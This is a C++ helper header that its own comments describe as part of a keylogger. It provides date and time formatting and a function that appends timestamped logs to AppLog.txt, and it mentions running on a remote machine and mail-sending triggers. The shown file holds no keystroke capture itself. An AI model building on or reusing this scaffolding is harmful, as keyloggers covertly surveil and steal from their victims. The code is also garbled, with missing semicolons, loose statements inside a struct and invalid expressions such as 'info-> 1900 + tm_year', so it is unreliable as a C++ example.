#ifndef HELPER_H
#define HELPER_H

#include<ctime> // Help helper header to retrieve time and reenter into program for mail sending triggers.
#include<string> // convert various data types to strings and then sending it out to log files.
#include<sstream> // convert various types to strings.

namespace Helper
{
    template <class T>
    std::string ToString(const T &) // convert anything to string for later filling log file.
    struct DateTime
    {
    DateTime() // local time and date on which keylogger is running.
    time_t ms; // represents time located in CTime library.
    time(&ms); // takes system time and place it into the address of variable.

    struct tm *info = localtime(*ms);
    D = info-> tm_mday;
    m = info-> tm_mon + 1; //adding 1 to it or else Jan will start from 0.
    y = info-> 1900 + tm_year;
    M = info-> tm_min;
    H = info-> tm_hour;
    S = info-> tm_sec;

    DateTime(int D, int m, int y, int M, int H, int S) : D(D), m(m), y(y), M(M), H(H), S(S) {}
    DateTime(int D, int m, int y) : D(D), m(m), y(y), H(0), M(0), S(0) {}

    DateTime Now() const // get current date & time, it will only read and not change anything
    {
        return DateTime(); // will return current date & time.
    }

    int D, m, y, H, M, S;

    std::string GetDateString() const  // format date in human-readable format
    {
        return std::string(D < 10 ? "0"  : "") + ToString(D) +
               std::string(m < 10 ? ".0" : ".") + ToString(m) + "." + ToString(y);
    }

    std::string GetTimeString(const std::string &sep = ":" ) const // format time in human-readable format
    {
        return std::string(H < 10 ? "0"  : "")  + ToString(H)  + sep +
               std::string(M < 10 ? ".0" : ".") + ToString(M)  + sep +
               std::string(S < 10 ? sep : "")   + ToString(S);
    }

    std::string GetDateTimeString(const std::string &sep = ":") const // combined function that will return both Date and Time
    {
        return GetDateString() + " " + GetTimeString(sep);
    }

    };

    template<class T>
    std:: string ToString(const T &e)
    {
        std:: ostringstream s;
        s << e;
        return s.str;
    }

    void WriteAppLog (const std::string &s)  // logs behavior of keylogger on remote machine. KeyLogger is not  dependent on this function.
    {
        std::ofstream file ("AppLog.txt", std::ios::app);
        file << "[" << Helper::DateTime().GetDateTimeString() << "]" << "\n" << s << std::endl << "\n";
        file.close();
    }
}


#endif // HELPER_H
